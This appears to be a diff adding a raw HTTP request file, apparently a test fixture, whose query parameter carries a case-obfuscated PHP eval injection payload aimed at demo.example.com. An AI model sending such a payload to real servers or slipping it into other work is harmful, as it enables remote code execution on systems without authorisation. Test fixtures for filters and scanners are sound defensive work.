@@ -1,0 +1,4 @@
+GET /a?path=$x%3D$_ReQuEsT['x'];EvAl($X); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
